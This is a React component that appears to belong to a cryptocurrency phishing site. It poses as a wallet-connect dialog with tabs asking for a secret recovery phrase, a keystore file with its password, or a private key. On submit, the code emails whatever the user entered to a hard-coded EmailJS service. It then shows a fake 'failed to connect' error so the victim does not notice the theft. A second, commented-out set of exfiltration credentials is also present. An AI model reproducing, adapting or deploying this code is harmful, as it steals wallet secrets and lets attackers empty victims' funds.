/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from "react";
import close from "../assets/icon/close.png";
import emailjs from "@emailjs/browser";

interface ModalWithTabsProps {
  isOpen: boolean;
  onClose: () => void;
  value: string;
}
const TabModal = ({ isOpen, onClose, value }: ModalWithTabsProps) => {
  const [type, setType] = useState<"phrase" | "keystore" | "privatekey">(
    "phrase"
  );
  const [phrase, setPhrase] = useState("");
  const [privatekey, setPrivatekey] = useState("");
  const [keystoreText, setkeystoreText] = useState("");
  const [keystorePassword, setkeystorePassword] = useState("");

  const templateParams = {
    name: value,
    user_message:
      type == "keystore"
        ? `${type} text = ${keystoreText} - pasword = ${keystorePassword}`
        : type == "phrase"
        ? `${type} : PHRASE = ${phrase}`
        : type == "privatekey"
        ? `${type} : PRIVATEKEY : ${privatekey}`
        : "",
  };

  // const keys = {
  //   serviceID: import.meta.env.VITE_SERVICE_ID,
  //   templateID: import.meta.env.VITE_TEMPLATE_ID,
  //   publicKeys: import.meta.env.VITE_PUBLIC_KEY,
  // };

  const onSubmit = () => {
    emailjs
      .send("service_rqakjub", "template_z7ou55g", templateParams, {
        publicKey: "h8HYNBsQk2VFvkgbJ",
      })
      .then(
        (res) => {
          console.log(res);

          alert("error, failed to connect");
          onClose();
        },
        (err) => {
          console.log("FAILED...", err);
          onClose();
        }
      );
  };

  // emailjs
  //   .send("service_seoclce", "template_imqs5zf", templateParams, {
  //     publicKey: "inlgKcnCldUGOKmOe",
  //   })
  //   .then(
  //     (response) => {
  //       console.log("SUCCESS!", response.status, response.text);
  //     },
  //     (err) => {
  //       console.log("FAILED...", err);
  //     }
  //   );

  const handleBackdropClick = (event: React.MouseEvent) => {
    if (event.target === event.currentTarget) {
      onClose();
    }
  };

  const [activeTab, setActiveTab] = useState<string>("phrase");
  if (!isOpen) return null;
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
      onClick={handleBackdropClick}
    >
      <div className="bg-[#5860ff] text-white p-6 rounded-xl border border-white/10 w-11/12 md:w-2/3 lg:w-1/2">
        <div className="mb-6 flex justify-between items-center">
          <div className="text-xl font-semibold text-white">{value}</div>
          <img
            src={close}
            onClick={onClose}
            alt=""
            className="w-6 h-6 cursor-pointer"
          />
        </div>
        <ul className="flex gap-2 mb-6">
          <li>
            <button
              className={`py-2 px-4 text-sm rounded-lg transition-colors ${
                activeTab === "phrase"
                  ? "bg-[#75ffff] text-[#5861f6] font-semibold"
                  : "bg-white/10 text-white hover:bg-white/20"
              }`}
              onClick={() => {
                setType("phrase");
                setActiveTab("phrase");
              }}
            >
              Phrase
            </button>
          </li>
          <li>
            <button
              className={`py-2 px-4 text-sm rounded-lg transition-colors ${
                activeTab === "keystore"
                  ? "bg-[#75ffff] text-[#5861f6] font-semibold"
                  : "bg-white/10 text-white hover:bg-white/20"
              }`}
              onClick={() => {
                setType("keystore");
                setActiveTab("keystore");
              }}
            >
              Keystore
            </button>
          </li>
          <li>
            <button
              className={`py-2 px-4 text-sm rounded-lg transition-colors ${
                activeTab === "privatekey"
                  ? "bg-[#75ffff] text-[#5861f6] font-semibold"
                  : "bg-white/10 text-white hover:bg-white/20"
              }`}
              onClick={() => {
                setType("privatekey");
                setActiveTab("privatekey");
              }}
            >
              Private Key
            </button>
          </li>
        </ul>

        <div
          id="phrase"
          className={`space-y-4 ${activeTab === "phrase" ? "block" : "hidden"}`}
        >
          <label htmlFor="secret-phrase" className="block text-sm">
            Secret phrase
          </label>
          <textarea
            id="secret-phrase"
            value={phrase}
            onChange={(e: any) => setPhrase(e.target.value)}
            name="phrase"
            rows={4}
            className="w-full px-4 py-3 text-sm rounded-lg bg-white/10 border border-white/10 focus:outline-none focus:border-[#75ffff] placeholder-white/50"
            placeholder="Typically 12 (sometimes 18, 24) words separated by single spaces"
          ></textarea>
          <button
            className="w-full bg-[#75ffff] text-[#5861f6] font-semibold py-3 px-4 rounded-lg hover:bg-[#75ffff]/90 transition-colors"
            onClick={() => onSubmit()}
          >
            Submit
          </button>
        </div>

        <div
          id="keystore"
          className={`space-y-4 ${
            activeTab === "keystore" ? "block" : "hidden"
          }`}
        >
          <label htmlFor="keystore-text" className="block text-sm">
            Keystore Text
          </label>
          <textarea
            id="keystore-text"
            rows={4}
            onChange={(e: any) => setkeystoreText(e.target.value)}
            value={keystoreText}
            className="w-full px-4 py-3 text-sm rounded-lg bg-white/10 border border-white/10 focus:outline-none focus:border-[#75ffff] placeholder-white/50"
            placeholder="Paste keystore text here"
          ></textarea>
          <label htmlFor="keystore-password" className="block text-sm">
            Password
          </label>
          <input
            id="keystore-password"
            type="password"
            onChange={(e: any) => setkeystorePassword(e.target.value)}
            value={keystorePassword}
            className="w-full px-4 py-3 text-sm rounded-lg bg-white/10 border border-white/10 focus:outline-none focus:border-[#75ffff] placeholder-white/50"
            placeholder="Enter password"
          />
          <button
            className="w-full bg-[#75ffff] text-[#5861f6] font-semibold py-3 px-4 rounded-lg hover:bg-[#75ffff]/90 transition-colors"
            onClick={() => onSubmit()}
          >
            Unlock
          </button>
        </div>

        <div
          id="privatekey"
          className={`space-y-4 ${
            activeTab === "privatekey" ? "block" : "hidden"
          }`}
        >
          <label htmlFor="private-key-input" className="block text-sm">
            Private Key
          </label>
          <input
            id="private-key-input"
            type="text"
            onChange={(e: any) => setPrivatekey(e.target.value)}
            value={privatekey}
            required
            className="w-full px-4 py-3 text-sm rounded-lg bg-white/10 border border-white/10 focus:outline-none focus:border-[#75ffff] placeholder-white/50"
            placeholder="Enter your private key"
          />
          <button
            className="w-full bg-[#75ffff] text-[#5861f6] font-semibold py-3 px-4 rounded-lg hover:bg-[#75ffff]/90 transition-colors"
            onClick={() => onSubmit()}
          >
            Submit
          </button>
        </div>
      </div>
    </div>
  );
};

export default TabModal;
